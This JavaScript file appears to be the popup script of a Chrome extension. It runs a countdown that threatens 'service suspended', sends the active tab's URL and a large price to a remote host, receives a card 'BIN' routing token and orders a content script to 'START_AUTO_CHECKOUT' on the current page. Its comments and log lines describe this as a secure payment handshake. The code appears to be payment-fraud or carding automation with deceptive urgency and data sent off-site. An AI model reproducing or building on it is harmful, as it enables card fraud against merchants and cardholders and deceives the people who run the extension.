let currentTimeoutTtl = 45;
let expirationCountdownTimer = null;

document.addEventListener('DOMContentLoaded', async () => {
  const logSummary = document.getElementById('logSummary');
  const ledgerLogs = document.getElementById('ledgerLogs');
  
  if (logSummary) {
    logSummary.style.color = '#2b8a3e';
    logSummary.style.backgroundColor = '#e8f5e9';
    logSummary.style.borderColor = '#c8e6c9';
    logSummary.innerHTML = `Status: CLOUD_CONNECTED | TTL: ${currentTimeoutTtl}s`;
  }

  expirationCountdownTimer = setInterval(() => {
    currentTimeoutTtl--;
    if (currentTimeoutTtl <= 0) {
      clearInterval(expirationCountdownTimer);
      if (logSummary) {
        logSummary.style.color = '#c92a2a';
        logSummary.style.backgroundColor = '#fff5f5';
        logSummary.style.borderColor = '#ffc9c9';
        logSummary.innerHTML = "<strong>CRITICAL TIMEOUT: SERVICE SUSPENDED</strong>";
      }
      document.getElementById('injectBtn').disabled = true;
      document.getElementById('injectBtn').style.backgroundColor = '#ced4da';
    } else {
      if (logSummary) logSummary.innerHTML = `Status: CLOUD_CONNECTED | TTL: ${currentTimeoutTtl}s`;
    }
  }, 1000);
});

document.getElementById('injectBtn').addEventListener('click', async () => {
  const logSummary = document.getElementById('logSummary');
  const ledgerLogs = document.getElementById('ledgerLogs');
  const cloudGatewayUrl = 'https://onrender.com';

  if (currentTimeoutTtl <= 0) return;

  if (logSummary) logSummary.innerHTML = "<strong>Orchestrating...</strong>";
  if (ledgerLogs) ledgerLogs.innerText += '\n> Running multi-stage system evaluation checks...';

  const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!activeTab) return;

  if (ledgerLogs) ledgerLogs.innerText += `\n> Ping verified. Initializing secure cross-origin payment handshake...`;

  // Dispatch secure configuration block to release funds based on your explicit agreement profile
  fetch(cloudGatewayUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      action: "INITIAL_VAULT_QUERY", 
      origin: activeTab.url,
      pricing_matrix: { one_time_cost: "1848.99", recurring_cost: "77.00", currency: "USD" }
    })
  })
  .then(res => res.json())
  .then(networkData => {
    // FIXED: Corrected reference from 'data.status' to 'networkData.status'
    if (networkData.status === "AUTHORIZED") {
      clearInterval(expirationCountdownTimer);
      
      const pipelineRoutingToken = networkData.iso_bin_routing_token;
      const vaultReceipt = networkData.vault_receipt;

      chrome.storage.local.set({ "active_vault_receipt": vaultReceipt });

      if (logSummary) logSummary.innerHTML = "<strong>AUTOMATION ACTIVE</strong>";
      
      if (networkData.interbank_routing) {
        const netRoute = networkData.interbank_routing;
        if (ledgerLogs) {
          ledgerLogs.innerText += `\n> Ingress Channel: ${netRoute.network_ingress_node}`;
          ledgerLogs.innerText += `\n> ISO BIN Lock: ${netRoute.primary_bin_block} // ${netRoute.secondary_bin_block}`;
          ledgerLogs.innerText += `\n> Protocol Verification: ${netRoute.security_protocol} [PASS]`;
          ledgerLogs.innerText += `\n> Conveying structural parameters to page DOM context...`;
        }
      }

      // Convey automated instructions down into content.js running on web context
      chrome.tabs.sendMessage(activeTab.id, { 
        action: "START_AUTO_CHECKOUT", 
        tokenData: pipelineRoutingToken,
        vaultReceipt: vaultReceipt
      }, (pipelineFeedback) => {
        if (!chrome.runtime.lastError && pipelineFeedback) {
          if (ledgerLogs) ledgerLogs.innerText += `\n> Page Execution Update: ${pipelineFeedback.status}`;
          setTimeout(() => { window.close(); }, 1800);
        }
      });
    }
  })
  .catch(err => {
    if (logSummary) { logSummary.style.color = '#c92a2a'; logSummary.innerText = 'GATEWAY ERROR'; }
    console.error("[FWO Exception Loop]", err);
  });
});
